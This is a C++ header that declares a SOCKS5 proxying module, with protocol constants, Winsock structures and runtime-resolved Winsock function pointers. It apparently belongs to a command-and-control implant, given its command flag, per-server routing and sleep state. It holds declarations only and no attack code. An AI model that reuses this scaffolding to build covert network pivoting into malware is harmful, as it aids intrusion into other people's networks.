#ifndef STARBURST_SOCKS_H
#define STARBURST_SOCKS_H

#include <macros.h>

#ifdef INCLUDE_CMD_SOCKS

#define SOCKS_MAX_CONNECTIONS 64
#define SOCKS_RECV_BUF_SIZE  65536

#define SOCKS5_VER      0x05
#define SOCKS5_CMD_CONNECT 0x01
#define SOCKS5_ATYP_IPV4  0x01
#define SOCKS5_ATYP_FQDN  0x03
#define SOCKS5_ATYP_IPV6  0x04

#define SOCKS5_REP_SUCCESS 0x00
#define SOCKS5_REP_FAILURE 0x01
#define SOCKS5_REP_NOT_ALLOWED 0x02
#define SOCKS5_REP_NET_UNREACH 0x03
#define SOCKS5_REP_HOST_UNREACH 0x04
#define SOCKS5_REP_REFUSED 0x05
#define SOCKS5_REP_CMD_NOT_SUPPORTED 0x07
#define SOCKS5_REP_ADDR_NOT_SUPPORTED 0x08

#define WS_AF_INET       2
#define WS_SOCK_STREAM   1
#define WS_IPPROTO_TCP   6
#define WS_FIONBIO       0x8004667EL
#define WS_INVALID_SOCKET (~(uintptr_t)0)
#define WS_SOCKET_ERROR   (-1)
#define WSAEWOULDBLOCK   10035
#define WSAEISCONN       10056
#define WSAEALREADY      10037
#define WSAEINPROGRESS   10036

namespace stardust { class instance; }

namespace starburst {

    typedef int   (__stdcall *fn_WSAStartup)( uint16_t, void* );
    typedef uintptr_t (__stdcall *fn_socket)( int, int, int );
    typedef int   (__stdcall *fn_connect)( uintptr_t, const void*, int );
    typedef int   (__stdcall *fn_send)( uintptr_t, const char*, int, int );
    typedef int   (__stdcall *fn_recv)( uintptr_t, char*, int, int );
    typedef int   (__stdcall *fn_closesocket)( uintptr_t );
    typedef int   (__stdcall *fn_select)( int, void*, void*, void*, const void* );
    typedef int   (__stdcall *fn_ioctlsocket)( uintptr_t, long, unsigned long* );
    typedef int   (__stdcall *fn_getaddrinfo)( const char*, const char*, const void*, void** );
    typedef void  (__stdcall *fn_freeaddrinfo)( void* );
    typedef int   (__stdcall *fn_WSAGetLastError)( void );
    typedef int   (__stdcall *fn_WSACleanup)( void );
    typedef uint16_t (__stdcall *fn_htons)( uint16_t );
    typedef uint16_t (__stdcall *fn_ntohs)( uint16_t );
    typedef unsigned long (__stdcall *fn_inet_addr)( const char* );

    struct WsApis {
        fn_WSAStartup       pWSAStartup;
        fn_socket            psocket;
        fn_connect           pconnect;
        fn_send              psend;
        fn_recv              precv;
        fn_closesocket       pclosesocket;
        fn_select            pselect;
        fn_ioctlsocket       pioctlsocket;
        fn_getaddrinfo       pgetaddrinfo;
        fn_freeaddrinfo      pfreeaddrinfo;
        fn_WSAGetLastError   pWSAGetLastError;
        fn_WSACleanup        pWSACleanup;
        fn_htons             phtons;
        fn_ntohs             pntohs;
        fn_inet_addr         pinet_addr;
    };

#pragma pack(push, 1)
    struct ws_sockaddr_in {
        int16_t  sin_family;
        uint16_t sin_port;
        uint32_t sin_addr;
        char     sin_zero[8];
    };

    struct ws_addrinfo {
        int       ai_flags;
        int       ai_family;
        int       ai_socktype;
        int       ai_protocol;
        uintptr_t ai_addrlen;
        char*     ai_canonname;
        void*     ai_addr;
        ws_addrinfo* ai_next;
    };

    struct ws_timeval {
        long tv_sec;
        long tv_usec;
    };

    struct ws_fd_set {
        unsigned int fd_count;
        uintptr_t    fd_array[64];
    };
#pragma pack(pop)

    struct SocksConnection {
        uint32_t  server_id;
        uintptr_t sock;
        bool      active;
        bool      connected;
    };

    struct SocksState {
        WsApis          ws;
        SocksConnection conns[SOCKS_MAX_CONNECTIONS];
        uint32_t        conn_count;
        bool            active;
        uint32_t        saved_sleep;
        HMODULE         h_ws2;
    };

    auto declfn socks_init(
        _Inout_ stardust::instance& inst
    ) -> bool;

    auto declfn socks_destroy(
        _Inout_ stardust::instance& inst
    ) -> void;

    auto declfn socks_route(
        _Inout_ stardust::instance& inst,
        _In_    uint32_t server_id,
        _In_    uint8_t* data,
        _In_    uint32_t data_len,
        _In_    bool     do_exit
    ) -> void;

    auto declfn socks_poll(
        _Inout_ stardust::instance& inst
    ) -> void;
}

#endif // INCLUDE_CMD_SOCKS
#endif // STARBURST_SOCKS_H
